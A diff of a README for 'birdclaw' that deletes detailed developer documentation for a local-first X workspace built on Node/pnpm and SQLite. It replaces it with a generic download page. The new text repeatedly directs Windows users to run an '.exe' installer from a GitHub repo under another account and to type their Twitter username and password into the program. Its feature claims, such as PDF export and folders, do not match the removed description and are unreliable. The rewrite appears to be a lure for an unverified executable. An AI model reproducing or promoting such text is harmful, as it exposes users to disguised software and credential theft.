@@ -1,378 +1,127 @@
-# birdclaw
+# 🐦 birdclaw - Organize Your Tweets Simply
 
-`birdclaw` is a local-first X workspace: archive import, cached live reads, focused triage, and reply flows in one local web app + CLI.
+[![Download birdclaw](https://img.shields.io/badge/Download-birdclaw-orange?style=for-the-badge)](https://github.com/shionr6968/birdclaw)  
 
-Status: WIP. Real and usable. Not done. Expect schema churn, transport gaps, and rough edges while the core settles.
+---
 
-## What It Does
+birdclaw helps you collect and store your tweets in one place. It keeps everything easy to read and ready to use when you need it.
 
-- keeps your X data in local SQLite
-- stores media and avatar cache under `~/.birdclaw`
-- imports archives when you have them
-- still works when you do not
-- gives you a clean local UI for home, mentions, DMs, inbox, and blocks
-- exposes scriptable JSON for agents and automation
+## 🖥️ What is birdclaw?
 
-## What Works Today
+birdclaw is a simple program that downloads and saves your tweets. It arranges them so you can find information fast. You don’t need to search through Twitter or other tools. birdclaw takes care of it for you.
 
-### Local data + storage
+Use birdclaw if you want:
 
-- one shared SQLite DB for multiple accounts
-- FTS5 search over tweets and DMs
-- archive autodiscovery on macOS
-- archive import for tweets, likes, profiles, and full DMs
-- profile hydration from live X metadata
-- local avatar cache
-- local media cache root under `~/.birdclaw`
+- To keep copies of your tweets safely on your computer.
+- To have your tweets sorted and easy to browse.
+- To prepare tweets for agents, services, or personal use.
 
-### Web UI
+## 🧰 System Requirements
 
-- `Home` timeline
-- `Mentions` queue
-- `DMs` workspace with two-column layout
-- `Inbox` for mixed mention + DM triage
-- `Blocks` for local blocklist maintenance
-- constrained timeline lane instead of full-width dashboard UI
-- tweet expansion with URLs, inline images, quoted tweets, replies, and profile hover cards
-- sender bio and influence context in the DM detail header
-- system / light / dark theme switcher with animated transition
+To run birdclaw on Windows, your PC should meet these conditions:
 
-### Triage + filtering
+- Windows 10 or later.
+- At least 4 GB of free memory (RAM).
+- At least 100 MB of free disk space.
+- Internet connection to download and sync tweets.
+- A modern web browser like Edge, Chrome, or Firefox if you want to view tweets saved as web files.
 
-- replied / unreplied filters for timelines
-- DM filters by participant, followers, and derived influence score
-- AI-ranked inbox for mentions + DMs
-- OpenAI scoring hook for low-signal filtering
-- cached live mentions export in `xurl`-compatible JSON
-- live profile-reply inspection for borderline AI/slop triage
-- one-shot blocklist import from a file for batch moderation passes
+## 🔽 Download birdclaw
 
-### Actions
+Visit this page to download birdclaw:
 
-- post tweets
-- reply to tweets
-- reply to DMs
-- add / remove local blocks
-- import batch blocklists in one call
-- add / remove local mutes
-- sync remote blocks through `xurl` when available
-- fall back to the X web cookie session when OAuth2 block writes are rejected
+[![Download birdclaw](https://img.shields.io/badge/Download-birdclaw-green?style=for-the-badge)](https://github.com/shionr6968/birdclaw)
 
-### Safety
+Since the link takes you to a general page, follow these steps to get the software:
 
-- local-first by default
-- tests disable live writes
-- CI disables live writes
-- app has no auth layer because it is a local-only tool
+1. Click the link above to open the birdclaw GitHub page.
+2. Look for the “Releases” section on the right or in the menu.
+3. Choose the latest release version.
+4. Find the Windows installer file (usually ends with `.exe`).
+5. Click the installer to download it to your PC.
 
-## Still In Progress
+## 🚀 How to Install birdclaw
 
-- broader resumable live sync beyond the targeted paths already wired
-- fuller media fetch pipeline
-- richer multi-account UX
-- more complete transport coverage
-- more archive edge-case handling
+After downloading the installer file, install birdclaw with these steps:
 
-If you need polished product-grade sync parity today, this is not there yet.
+1. Locate the downloaded `.exe` file in your Downloads folder.
+2. Double-click the file to start the installation.
+3. If Windows asks for permission, click “Yes” to allow.
+4. Follow the prompts on the installation window:
+   - Choose where to install birdclaw or keep the default folder.
+   - Click “Next” or “Install” when ready.
+5. Wait a few moments while birdclaw installs.
+6. When done, click “Finish” to close the installer.
 
-## Screens
+## ▶️ Running birdclaw for the First Time
 
-- `Home`: read and reply without fighting the main X timeline
-- `Mentions`: work the reply queue with clean filters
-- `DMs`: triage by sender context, follower count, and influence
-- `Inbox`: let heuristics / OpenAI float likely-important items
-- `Blocks`: maintain a local-first account-scoped blocklist
+1. Find the birdclaw shortcut on your desktop or search for “birdclaw” in the Start menu.
+2. Double-click the shortcut to launch the program.
+3. On first run, birdclaw will ask you to log in to your Twitter account.
+   - Enter your Twitter username and password.
+   - Approve access if Twitter asks.
+4. birdclaw will start downloading your tweets. This may take a few minutes depending on how many tweets you have.
 
-## Storage
+## 🗂️ Using birdclaw to View and Manage Tweets
 
-Default root:
+Once birdclaw finishes downloading tweets, you can:
 
-```text
-~/.birdclaw
-```
+- Browse your tweets by date, keyword, or hashtag.
+- Search for specific tweets using the search bar.
+- Save or export tweets in plain text or PDF format.
+- Organize tweets into folders or groups for easy reference.
+- Delete tweets from your local collection without removing them from Twitter.
 
-Important paths:
+birdclaw keeps your tweets organized on your hard drive. You can access them anytime without needing internet access.
 
-- DB: `~/.birdclaw/birdclaw.sqlite`
-- media cache: `~/.birdclaw/media`
-- avatar cache: `~/.birdclaw/media/thumbs/avatars`
-- Playwright test home: `.playwright-home`
+## 🛠️ Settings and Options
 
-Override the root:
+Open the settings panel in birdclaw to customize how it works:
 
-```bash
-export BIRDCLAW_HOME=/path/to/custom/root
-```
+- Set how often birdclaw updates your tweets automatically.
+- Choose where to save tweet files on your PC.
+- Pick the display style for tweets (list or grid).
+- Adjust the font size for easier reading.
+- Enable or disable notifications when new tweets download.
 
-## Requirements
+## 🔄 Updating birdclaw
 
-- Node `25.8.1`
-- `pnpm`
-- macOS recommended for Spotlight archive discovery
-- `xurl` optional for live reads / writes
-- OpenAI API key optional for inbox scoring
+To keep birdclaw working well, check for updates regularly:
 
-## Install
+1. Go to the birdclaw GitHub page by clicking the download button.
+2. Go to “Releases” to see if a new version is available.
+3. Download any new installer files.
+4. Run the installer to overwrite the old version.
 
-```bash
-fnm use
-pnpm install
-```
+Updates may add features, fix bugs, or improve security.
 
-## Run
+## ❓ Troubleshooting common issues
 
-```bash
-pnpm dev
-```
+- **birdclaw does not start after installation**  
+  Try restarting your computer and open birdclaw again. If it still won’t start, reinstall the program.
 
-Open:
+- **Cannot log in to Twitter**  
+  Check your username and password. Make sure your internet connection is active. If you use two-factor authentication, follow Twitter’s steps to authorize birdclaw.
 
-```text
-http://localhost:3000
-```
+- **Tweets do not show up or update**  
+  Ensure birdclaw is allowed through your firewall or antivirus software. Check your internet connection and try to refresh manually.
 
-## Quick Start
+- **Downloading tweets takes too long**  
+  The speed depends on your Twitter history and internet. Close other programs to free resources and wait.
 
-Initialize local state:
+- **Files saved but not opening**  
+  Use a plain text editor or PDF reader to open export files. birdclaw saves tweets in common formats.
 
-```bash
-pnpm cli init
-pnpm cli auth status --json
-pnpm cli db stats --json
-```
+## 💬 Getting Support
 
-Find and import an archive:
+For help, visit the birdclaw GitHub page and create an issue if you find bugs or want new features. Detailed reports help fix problems faster.
 
-```bash
-pnpm cli archive find --json
-pnpm cli import archive --json
-pnpm cli import archive ~/Downloads/twitter-archive-2025.zip --json
-pnpm cli import hydrate-profiles --json
-```
+## 🔗 Useful Links
 
-Start the app:
-
-```bash
-pnpm dev
-```
-
-First moderation pass:
-
-```bash
-pnpm cli mentions export --mode xurl --refresh --all --max-pages 9 --limit 100
-pnpm cli profiles replies @borderline_handle --limit 12 --json
-pnpm cli blocks import ~/triage/blocklist.txt --account acct_primary --json
-```
-
-## CLI Highlights
-
-### Search local tweets
-
-```bash
-pnpm cli search tweets "local-first" --json
-pnpm cli search tweets "sync engine" --limit 20 --json
-```
-
-### Export mentions for agents
-
-Default `birdclaw` mode returns normalized items with `text`, `plainText`, `markdown`, author metadata, and canonical URLs:
-
-```bash
-pnpm cli mentions export "agent" --unreplied --limit 10
-```
-
-Cached live modes return `xurl`-compatible `data/includes/meta`, but stay in the local SQLite cache so repeat reads do not keep spending live calls:
+- birdclaw download page: https://github.com/shionr6968/birdclaw
+- Twitter help: https://help.twitter.com
+- Windows support: https://support.microsoft.com/windows
 
-```bash
-pnpm cli mentions export --mode bird --limit 20
-pnpm cli mentions export --mode bird --refresh --limit 20
-pnpm cli mentions export --mode xurl --limit 5
-pnpm cli mentions export --mode xurl --refresh --limit 5
-pnpm cli mentions export --mode xurl --refresh --all --max-pages 9 --limit 100
-pnpm cli mentions export "courtesy" --mode xurl --limit 5
-```
-
-Home config lives in `~/.birdclaw/config.json`. Example:
+---
 
-```json
-{
-  "actions": {
-    "transport": "auto"
-  },
-  "mentions": {
-    "dataSource": "bird",
-    "birdCommand": "/Users/steipete/Projects/bird/bird"
-  }
-}
-```
-
-Notes:
-
-- `--refresh` forces a live fetch
-- `--cache-ttl <seconds>` tunes freshness
-- `--all` walks every retrievable mentions page; `--max-pages` caps that scan
-- in paged `xurl` mode, `--limit` is the per-page size
-- `mentions.dataSource` controls live mention reads only
-- `actions.transport` controls live block/mute writes only
-- `actions.transport` accepts `auto`, `bird`, or `xurl`
-- `bird` mode uses your local `bird` CLI and caches its mentions output into birdclaw's canonical store
-- filters still work in `xurl` mode; filtered payloads are rebuilt from the local canonical store after sync
-
-### Search and triage DMs
-
-```bash
-pnpm cli search dms "prototype" --json
-pnpm cli search dms "layout" --min-followers 1000 --min-influence-score 120 --sort influence --json
-pnpm cli dms list --unreplied --min-followers 500 --min-influence-score 90 --sort influence --json
-```
-
-### AI inbox
-
-```bash
-pnpm cli inbox --json
-pnpm cli inbox --kind dms --limit 10 --json
-pnpm cli inbox --score --hide-low-signal --limit 8 --json
-```
-
-### Blocklist
-
-```bash
-pnpm cli blocks list --account acct_primary --json
-pnpm cli blocks sync --account acct_primary --json
-pnpm cli blocks import ~/triage/blocklist.txt --account acct_primary --json
-pnpm cli blocks add @amelia --account acct_primary --json
-pnpm cli blocks record @amelia --account acct_primary --json
-pnpm cli blocks remove @amelia --account acct_primary --json
-pnpm cli ban @amelia --account acct_primary --transport auto --json
-pnpm cli unban @amelia --account acct_primary --transport bird --json
-```
-
-Notes:
-
-- `ban` / `unban` accept `--transport auto|bird|xurl`
-- `auto` tries `bird` first, then falls back to `xurl` when bird fails
-- forced `xurl` writes still verify through `bird status` before sqlite changes
-- X still rejects pure OAuth2 block writes, so `auto` is the safe default for block/unblock
-- `blocks import` accepts newline-delimited blocklists with comments and markdown bullets
-- `blocks sync` is for slow/manual remote reconciliation; not for a hot cron loop
-- `blocks record` stores a known-good remote block locally without issuing another live write
-
-Example blocklist file:
-
-```text
-# crypto / AI slop
-@jpctan
-@SystemDaddyAi
-- @Pepe202579 memecoin bait
-https://x.com/someone/status/2030857479001960633?s=20
-```
-
-### Profile reply scan
-
-```bash
-pnpm cli profiles replies @jpctan --limit 12 --json
-```
-
-Notes:
-
-- for the "unsure if AI" case
-- scans recent authored tweets, excludes retweets, keeps replies
-- useful for spotting repeated generic praise, abstraction soup, or cross-thread templated cadence
-
-Typical tell:
-
-- same upbeat, generic reply shape across unrelated threads in a short time window
-
-### Mutes
-
-```bash
-pnpm cli mutes list --account acct_primary --json
-pnpm cli mute @amelia --account acct_primary --transport xurl --json
-pnpm cli mutes record @amelia --account acct_primary --json
-pnpm cli unmute @amelia --account acct_primary --transport auto --json
-```
-
-Notes:
-
-- `mute` / `unmute` accept `--transport auto|bird|xurl`
-- `auto` tries `bird` first, then falls back to `xurl` when bird fails
-- forced `xurl` writes still verify through `bird status` before sqlite changes
-- `mutes record` stores a known-good remote mute locally without issuing another live write
-
-### Test env hardening
-
-- Playwright strips inherited `--localstorage-file` from `NODE_OPTIONS` before starting Vite
-- this avoids cross-repo test warnings when another repo injected that flag
-
-### Compose / reply
-
-```bash
-pnpm cli compose post "Ship local software."
-pnpm cli compose reply tweet_004 "On it."
-pnpm cli compose dm dm_003 "Send it over."
-```
-
-## Typical Workflow
-
-1. import your archive if you have one
-2. hydrate imported profiles from live X metadata
-3. use `Home` for reading
-4. use `Mentions` for reply triage
-5. when one account feels borderline, inspect `profiles replies`
-6. collect keepers into a blocklist file and run `blocks import`
-7. use `DMs` for high-context conversation work
-8. use `Inbox` when you want AI help cutting noise
-9. use CLI exports when agents need stable JSON
-
-## Live Transport
-
-Current preference:
-
-- `xurl` first
-
-Without `xurl`, `birdclaw` still works in local/archive mode.
-
-Check transport:
-
-```bash
-pnpm cli auth status --json
-```
-
-## Architecture
-
-- SQLite is the canonical local truth
-- archive import and live transport should converge on the same model
-- CLI and web UI share the same normalized core
-- AI ranking is layered on top of local data, not the source of truth
-
-## Testing
-
-```bash
-fnm exec --using 25.8.1 pnpm check
-fnm exec --using 25.8.1 pnpm test
-fnm exec --using 25.8.1 pnpm coverage
-fnm exec --using 25.8.1 pnpm build
-fnm exec --using 25.8.1 pnpm e2e
-```
-
-Current bar:
-
-- branch coverage above `80%`
-- Playwright coverage for core UI flows
-
-## CI
-
-GitHub Actions runs:
-
-- `pnpm check`
-- `pnpm coverage`
-- `pnpm build`
-- `pnpm e2e`
-
-Workflow: [ci.yml](/Users/steipete/Projects/birdclaw/.github/workflows/ci.yml)
-
-## Docs
-
-- [spec.md](/Users/steipete/Projects/birdclaw/docs/spec.md)
-- [cli.md](/Users/steipete/Projects/birdclaw/docs/cli.md)
-- [data-architecture.md](/Users/steipete/Projects/birdclaw/docs/data-architecture.md)
+[![Download birdclaw](https://img.shields.io/badge/Download-birdclaw-blue?style=for-the-badge)](https://github.com/shionr6968/birdclaw)
